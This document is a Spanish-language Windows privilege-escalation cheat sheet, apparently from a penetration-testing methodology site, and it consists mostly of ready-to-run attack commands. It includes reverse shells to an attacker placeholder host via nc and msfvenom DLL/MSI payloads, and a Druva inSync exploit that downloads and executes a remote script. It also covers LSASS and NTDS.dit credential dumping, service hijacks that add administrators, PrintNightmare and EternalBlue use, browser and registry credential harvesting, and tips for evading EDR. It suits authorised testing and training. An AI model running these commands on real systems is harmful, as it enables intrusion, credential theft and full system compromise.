---
title: "Windows PrivEsc"
description: "UAC bypass, token impersonation, services y AlwaysInstallElevated."
sidebar:
  order: 3
  label: "Windows PrivEsc"
---

<aside class="my-8 p-5 rounded-lg border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose shadow-lg backdrop-blur-sm">
  <div class="text-xs uppercase tracking-widest text-[#cba6f7] font-bold mb-2 font-mono flex items-center gap-2">
    <span class="inline-block w-2 h-2 rounded-full bg-[#cba6f7] animate-pulse"></span>
    Language Fallback · Contenido en Español
  </div>
  <p class="text-sm text-zinc-300 leading-relaxed">
    This methodology cheatsheet is currently written in Spanish. Technical command syntaxes, cheatsheets, and checklists remain highly readable. You can switch back to Spanish at any time using the language toggle above.
  </p>
</aside>

> Escalada de privilegios en Windows: abuso de privilegios de token, grupos privilegiados, servicios mal configurados, exploits de kernel, y búsqueda de credenciales en texto claro.

---


## Enumeración inicial

```powershell
# Situational awareness
systeminfo
hostname; whoami; whoami /priv; whoami /groups
net user; net user USERNAME; net localgroup
net localgroup Administrators

# Procesos y servicios
tasklist /svc
Get-Process | Select-Object Name, Id, Path

# Parches instalados
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | ft -AutoSize

# Red
ipconfig /all; netstat -ano; arp -a

# Software instalado
wmic product get name
Get-ChildItem 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall' |
  Get-ItemProperty | Select-Object DisplayName,DisplayVersion

# AppLocker y Defender
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
Get-MpComputerStatus
```

```cmd
:: Herramientas clásicas CMD
set                            # variables de entorno
net accounts                   # política de contraseñas
echo %PATH%                    # PATH actual
findstr /spin "password" *.*   # buscar credenciales en archivos
```

---

## Privilegios clave — Tabla

| Privilegio | Técnica de explotación |
|------------|----------------------|
| `SeImpersonatePrivilege` | PrintSpoofer (Win10/2019+), JuicyPotato (2016-) |
| `SeDebugPrivilege` | ProcDump lsass → Mimikatz |
| `SeBackupPrivilege` | Copiar NTDS.dit + SYSTEM hive → secretsdump |
| `SeTakeOwnershipPrivilege` | takeown + icacls → modificar ejecutable de servicio |
| `SeLoadDriverPrivilege` | Capcom.sys → EoPLoadDriver + ExploitCapcom |
| `SeRestorePrivilege` | Restaurar archivos de sistema, DLL hijacking |

---

## SeImpersonatePrivilege → SYSTEM

### PrintSpoofer (Windows 10 / Server 2019+)

```powershell
# Verificar privilegio
whoami /priv   # → SeImpersonatePrivilege: Enabled

# Escalar a SYSTEM
.\PrintSpoofer.exe -c "nc.exe OUR_IP 8443 -e cmd"
.\PrintSpoofer.exe -i -c powershell.exe   # shell interactiva
```

### JuicyPotato (Windows Server 2016 y anterior)

```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
  -a "/c nc.exe OUR_IP 8443 -e cmd.exe" -t *
:: -l puerto COM local | -t * = CreateProcessWithToken + CreateProcessAsUser
```

### RoguePotato / SweetPotato (alternativas modernas)

```powershell
.\RoguePotato.exe -r OUR_IP -e "nc.exe OUR_IP 8443 -e cmd.exe" -l 9999
```

---

## SeDebugPrivilege → Volcar LSASS

```cmd
:: Usando ProcDump (Sysinternals, no lo detecta AV fácilmente)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: Volcar con Task Manager: Detalles → lsass.exe → crear dump
```

```powershell
# Cargar dump en Mimikatz (en nuestra máquina o localmente)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## SeBackupPrivilege → NTDS.dit

```powershell
# Método 1: Copy-FileSeBackupPrivilege (necesita módulo SeBackupPrivilege)
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Crear shadow copy con diskshadow
diskshadow.exe
  set verbose on
  set metadata C:\Windows\Temp\meta.cab
  set context clientaccessible
  begin backup
  add volume C: alias cdrive
  create
  expose %cdrive% E:
  end backup
  exit

# Copiar NTDS.dit desde el shadow
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# O con robocopy (flag /B para backup mode)
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

# Guardar hives del sistema
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Extraer hashes (en Kali/Pwnbox)
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

---

## SeTakeOwnershipPrivilege → Tomar control de archivo

```cmd
:: Tomar propiedad
takeown /f "C:\target\sensitive_file.txt"

:: Dar permisos completos
icacls "C:\target\sensitive_file.txt" /grant htb-student:F

:: Leer el archivo (ej: utilman.exe, sethc.exe)
```

---

## Grupos privilegiados

### Backup Operators → SeBackupPrivilege + SeRestorePrivilege

```powershell
# Si el usuario es miembro de Backup Operators:
whoami /groups | findstr "Backup"
# → Usar técnica SeBackupPrivilege (ver arriba)
```

### DnsAdmins → DLL injection en DNS (Domain Admin)

```bash
# 1. Generar DLL maliciosa (en Kali)
msfvenom -p windows/x64/exec \
  cmd='net group "domain admins" netadm /add /domain' \
  -f dll -o adduser.dll

# O reverse shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=OUR_IP LPORT=9001 -f dll -o shell.dll
```

```cmd
:: 2. Cargar DLL en el servidor DNS (como miembro de DnsAdmins)
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

:: 3. Reiniciar el servicio DNS (necesita permisos, a veces disponibles)
sc stop dns
sc start dns
```

### Hyper-V Administrators → Admin de VMs (si el DC es VM)

```powershell
# Miembro de Hyper-V Administrators en un host con DC como VM
# → Acceso completo a snapshots del DC → extraer NTDS.dit del snapshot
```

### Print Operators → SeLoadDriverPrivilege → SYSTEM

```powershell
# 1. Habilitar SeLoadDriverPrivilege (a veces deshabilitado por defecto)
#    Usar EnableSeLoadDriverPrivilege.ps1 o PrivescCheck.ps1

# 2. Cargar driver vulnerable Capcom.sys
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# 3. Explotar el driver para SYSTEM shell
.\ExploitCapcom.exe
```

### Server Operators → Modificar binPath de servicio

```cmd
:: Cambiar binPath de un servicio que corre como SYSTEM
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
sc start AppReadiness     :: fallará pero ejecuta el comando

:: Verificar
net localgroup Administrators
```

### Event Log Readers → Leer logs de seguridad

```powershell
# Buscar credenciales en logs de Security
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /c:100 | Select-String "pass"

# Confirmar membresía
net localgroup "Event Log Readers"
```

---

## UAC Bypass — DLL Hijacking

```bash
# 1. Generar DLL de reverse shell (en Kali)
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=8443 \
  -f dll > srrstr.dll
```

```powershell
# 2. Copiar DLL al path cargado por SystemPropertiesAdvanced.exe
#    (antes de C:\Windows\System32\, busca en WindowsApps del usuario)
$env:USERNAME  # → obtener username
# Colocar en:
# C:\Users\USERNAME\AppData\Local\Microsoft\WindowsApps\srrstr.dll

# 3. Ejecutar el binario afectado (32-bit, bypass UAC automático)
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

# → Recibir shell como usuario con token elevado (High Integrity)
```

```powershell
# Alternativa: Bypass-UAC.ps1 (método sysprep)
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

---

## Servicios vulnerables

### Weak Service Permissions (sc config binPath)

```powershell
# 1. Detectar con SharpUp
.\SharpUp.exe audit

# 2. Verificar permisos con accesschk
accesschk.exe /accepteula -quvcw WindscribeService
# Buscar: SERVICE_ALL_ACCESS o SERVICE_CHANGE_CONFIG para nuestro usuario

# 3. Cambiar binPath
sc config WindscribeService binpath="cmd /c net localgroup administrators USER /add"
sc stop WindscribeService
sc start WindscribeService

# O reverse shell:
sc config SVC binpath="C:\tools\nc.exe OUR_IP 8443 -e cmd.exe"
sc start SVC
```

### Unquoted Service Paths

```cmd
:: Detectar servicios con paths sin comillas y espacios
wmic service get name,displayname,pathname,startmode ^
  | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

:: Si hay: C:\Program Files\My Service\svc.exe
:: → Colocar: C:\Program.exe o C:\Program Files\My.exe (que ejecutamos primero)
```

### Registry ACL — Weak Permissions en ImagePath

```powershell
# Verificar ACLs en registry keys de servicios
Get-ACL -Path "HKLM:\System\CurrentControlSet\Services\SERVICENAME" | fl

# Si tenemos write access:
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\SERVICENAME" `
  -Name ImagePath -Value "cmd /c net localgroup administrators USER /add"
sc start SERVICENAME
```

### Vulnerable Services (terceros) — Druva inSync

```powershell
# Druva inSync 6.6.3 → command injection vía RPC en puerto 6064
netstat -ano | findstr 6064   # confirmar que el servicio escucha

# PoC PowerShell (modificar $cmd a voluntad)
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://OUR_IP/shell.ps1')"
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)
$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
```

---

## Kernel Exploits

### HiveNightmare / SeriousSAM (CVE-2021-36934) — Win10

```cmd
:: Verificar permisos en SAM (usuarios normales no deberían tener acceso)
icacls c:\Windows\System32\config\SAM
:: Si muestra BUILTIN\Users:(I)(RX) → vulnerable

:: Explotar (extrae copias de sombra de SAM, SYSTEM, SECURITY)
.\HiveNightmare.exe

:: Extraer hashes (en Kali)
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 ^
  -security SECURITY-2021-08-07 local
```

### PrintNightmare (CVE-2021-1675) — Windows universal

```powershell
# Verificar que Spooler esté activo
ls \\localhost\pipe\spoolss   # → si existe, Spooler está corriendo

# Explotar (añadir usuario local admin)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

# Verificar
net user hacker
net localgroup administrators
```

### MS17-010 EternalBlue (CVE-2017-0144) — Win7/2008 sin parchear

```bash
# Desde Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST OUR_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### CVE-2020-0668 — Windows Service Tracing (Win7–Win10 pre-2004)

```bash
# PoC: https://github.com/itm4n/CVE-2020-0668
# Eleva un ejecutable arbitrario a SYSTEM via symbolic link attack
# Usar con un ejecutable que añada usuario al grupo Admins
```

---

## Búsqueda de credenciales (Credential Hunting)

### PowerShell History

```powershell
# Localizar archivo de historial
(Get-PSReadLineOption).HistorySavePath
# → C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Leer historial del usuario actual
gc (Get-PSReadLineOption).HistorySavePath

# Leer de todos los usuarios (como admin)
foreach($user in ((ls C:\users).fullname)){
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

### Buscar contraseñas en archivos

```cmd
:: Buscar "password" en archivos de texto/config
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

:: Búsqueda recursiva general
findstr /spin "password" *.*

:: Buscar archivos por nombre
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

```powershell
# PowerShell — buscar en contenido
Select-String -Path C:\Users\*\Documents\*.txt -Pattern password -ErrorAction SilentlyContinue

# Buscar por extensión
Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore
```

### AutoLogon — credenciales en registro

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Buscar: DefaultPassword, DefaultUserName, AutoAdminLogon = 1
```

### PuTTY — proxy credentials en registro

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\SESSION_NAME"
# Buscar: ProxyUsername, ProxyPassword
```

### WiFi passwords

```cmd
netsh wlan show profile                      :: listar perfiles
netsh wlan show profile "SSID" key=clear     :: mostrar contraseña (Key Content)
```

### cmdkey — credenciales guardadas para RDP

```cmd
cmdkey /list
:: Si hay credenciales → reutilizar con runas
runas /savecred /user:DOMAIN\user "cmd.exe"
```

### Unattend.xml — instalaciones desatendidas

```cmd
:: Posibles ubicaciones
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\setup\scripts\*.xml
:: Buscar: <Password><Value>...</Value> (puede ser plaintext o base64)
```

### StickyNotes — base de datos SQLite

```powershell
# Localizar archivo
ls C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\

# Leer con PSSQLite
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\USER\AppData\Local\...\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Alternativa desde Kali: copiar plum.sqlite* y usar DB Browser for SQLite
# O: strings plum.sqlite-wal
```

### Chrome Dictionary + Browser Credentials

```powershell
# Chrome dictionary (passwords escritas en el browser)
gc 'C:\Users\USER\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# Browser credentials con SharpChrome (GhostPack)
.\SharpChrome.exe logins /unprotect
```

### PowerShell credentials (DPAPI)

```powershell
# Si encontramos un pass.xml o similar
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

### KeePass — extraer y crackear

```bash
# Extraer hash del .kdbx
python2.7 keepass2john.py archivo.kdbx > hash.txt

# Crackear con hashcat (mode 13400)
hashcat -m 13400 hash.txt /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### LaZagne — todo-en-uno

```powershell
.\lazagne.exe all          # todos los módulos
.\lazagne.exe browsers     # solo browsers
.\lazagne.exe windows      # Windows internals (DPAPI, Credman, LSA secrets)
.\lazagne.exe -vv          # verbose con detalles
```

### SessionGopher — PuTTY, WinSCP, RDP, FileZilla

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target HOSTNAME
Invoke-SessionGopher -Thorough    # también busca .ppk, .rdp
```

---

## AlwaysInstallElevated

```cmd
:: Verificar ambas claves (deben ser 0x1 en ambas)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# Con PowerUp → generar MSI malicioso
Import-Module .\PowerUp.ps1
Write-UserAddMSI    # crea UserAdd.msi en el directorio actual

# Ejecutar el MSI (pide usuario/contraseña para añadir al grupo Admins)
.\UserAdd.msi
```

```bash
# Con msfvenom (payload MSI)
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=9001 -f msi > shell.msi

# Ejecutar en el target (como usuario normal → SYSTEM)
msiexec /quiet /qn /i shell.msi
```

---

## Herramientas de enumeración automática

```powershell
# winPEAS — enumeración completa
.\winPEASx64.exe
.\winPEASx64.exe quiet         # menos output

# SharpUp — focuses en privesc paths
.\SharpUp.exe audit

# PowerUp — PowerShell puro
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — situational awareness detallado
.\Seatbelt.exe -group=all

# Watson — kernel CVE checker
.\Watson.exe

# WES-NG — desde Kali, basado en systeminfo
python3 wes.py systeminfo.txt -i "Elevation of Privilege"
```

---

## Citrix / Kiosk Breakout (resumen)

```
1. Abrir una app que tenga File → Open (Paint, Notepad, Wordpad)
2. En el dialog box → escribir UNC path: \\127.0.0.1\c$\users\USER
3. Ejecutar cmd desde SMB share con pwn.exe (binario que llama system("cmd.exe"))
4. Detectar AlwaysInstallElevated → PowerUp Write-UserAddMSI → backdoor admin
5. UAC bypass con Bypass-UAC.ps1 -Method UacMethodSysprep
```

---

## Pitfalls / Gotchas

- **PrintSpoofer vs JuicyPotato:** PrintSpoofer funciona en Win10/Server 2019+. JuicyPotato requiere Win Server ≤2016 (el CLSID por defecto no funciona en versiones modernas).
- **SeImpersonate en contexto de servicio:** el privilegio debe estar *habilitado* (`Enabled`), no solo presente (`Present`). Verificar con `whoami /priv`.
- **SeDebugPrivilege + lsass:** en Win10 20H2+ con Credential Guard, lsass estará protegido y Mimikatz no extraerá credenciales útiles del dump.
- **DnsAdmins:** reiniciar el servicio DNS requiere tener el privilegio `SC_MANAGER_ALL_ACCESS` o ser admin local. En DCs, los miembros de DnsAdmins pueden reiniciarlo; en servidores separados, no siempre.
- **HiveNightmare:** solo aplica a Windows 10 21H1 y anteriores (KB5003791 lo parchea). Verificar con `winver`.
- **UAC bypass srrstr.dll:** funciona cuando el binario `SystemPropertiesAdvanced.exe` busca `srrstr.dll` en `WindowsApps` del usuario. El path exacto varía por versión de Windows.
- **Unquoted paths:** la explotación solo funciona si tenemos write en el directorio padre y el servicio corre como SYSTEM/privilegiado.
- **AlwaysInstallElevated:** ambas claves HKCU y HKLM deben estar en 1. Si solo una está configurada, no funciona.
- **winPEAS ruido:** genera eventos de log (ID 4688, 4703). En engagements sigilosos, preferir enumeración manual o scripts más pequeños.
- **cmdkey /runas:** si la contraseña guardada en cmdkey es antigua o expiró, `runas /savecred` devolverá acceso denegado sin error claro.
- **LaZagne detección:** es bien conocido por EDRs. Subir renombrado o usar desde memoria (IEX + downloadString).
- **Druva inSync 6.6.3:** el path traversal `../../../Windows/System32/cmd.exe` funciona porque el servicio valida el inicio de path pero no la salida.

---

## Cheatsheets relacionados

- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — escalada de dominio una vez con foothold local
- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — hashcat, cracking, Pass-the-Hash, PTT
- [File Transfers](/en/metodologias/privesc/file-transfers/) — mover winPEAS/SharpUp al target
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells y payloads para los exploits
- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — contraparte en sistemas Linux
